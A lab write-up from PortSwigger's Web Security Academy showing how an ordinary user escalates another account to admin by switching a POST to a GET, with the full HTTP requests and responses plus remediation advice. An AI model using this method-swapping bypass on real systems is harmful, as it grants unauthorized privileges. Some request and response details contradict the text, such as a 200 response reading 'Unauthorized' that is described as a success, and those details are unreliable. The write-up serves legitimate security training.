# Lab: Method-based access control can be circumvented

- **Platform:** PortSwigger Web Security Academy
- **Vulnerability Type:** Access Control Bypass (Method Manipulation)
- **Difficulty Level:** Practitioner
- **Date:** 2026-07-20

## 📌 Summary

In this lab, it was discovered that the server performs authorization checks only on POST requests but bypasses this check on GET requests. This vulnerability allowed an unauthorized user to perform an operation requiring admin privileges by changing the HTTP method.

## 🔍 Discovery Phase

1. **Logged in with the admin account** and analyzed the POST request made to the `/admin-roles` endpoint via Burp Suite.

**Request (with admin account):**
http
POST /admin-roles HTTP/2
Host: 0ac600e20308dd27813e437a00370095.web-security-academy.net
Cookie: session=rv15UCj1I1egLHss3i6iQv3EX6Cbed3RF
Content-Type: application/json;charset=utf-8
Content-Length: 30

{“username”:“carlos”,‘action’:“upgrade”}
Response:

http
HTTP/2 200 OK
Content-Length: 14

“Unauthorized”
Here, the request made with the admin account was successful, and Carlos was granted admin privileges. (SS: Screenshot 1)

A session was opened with an unauthorized user (wiener), and the same POST request was repeated using wiener’s session cookie.

Request (using the wiener account - POST):

http
POST /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0ac600e20308dd27813e437a00370095.web-security-academy.net
Cookie: session=nvi5UCjillegLHs3i6iQv3EX6Cbed3RF
Response:

http
HTTP/2 401 Unauthorized
Content-Length: 14

"Unauthorized
As expected, the unauthorized user was unable to perform this operation.

🚀 Exploiting the Vulnerability
The POST request was changed to a GET request and resubmitted with the same parameters.

Request (GET - using the wiener account):

http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0ac600e20308dd27813e437a00370095.web-security-academy.net
Cookie: session=nvi5UCjillegLHs3i6iQv3EX6Cbed3RF
Response:

http
HTTP/2 302 Found
Location: /admin
Content-Length: 0
The 302 response indicates that the operation was successful and the user was redirected to the /admin page. This confirms that Carlos has obtained admin privileges.

Result: The authorization check was bypassed using the GET method, and the lab was successfully completed.

🔧 Remediation Recommendation
On the server side, the same authorization check must be applied for all HTTP methods (GET, POST, PUT, DELETE, etc.).

Authorization checks should be based on user role and operation, not on the method.

Session information and permission levels must be verified for every request received from a user.

📚 Lessons Learned
Applying permission controls only to specific methods can create a serious security vulnerability.

Attackers can manipulate HTTP methods to bypass permission controls.

Developers should implement method-independent authorization checks on all endpoints.

🔗 Lab Link
PortSwigger - Method-based access control can be circumvented
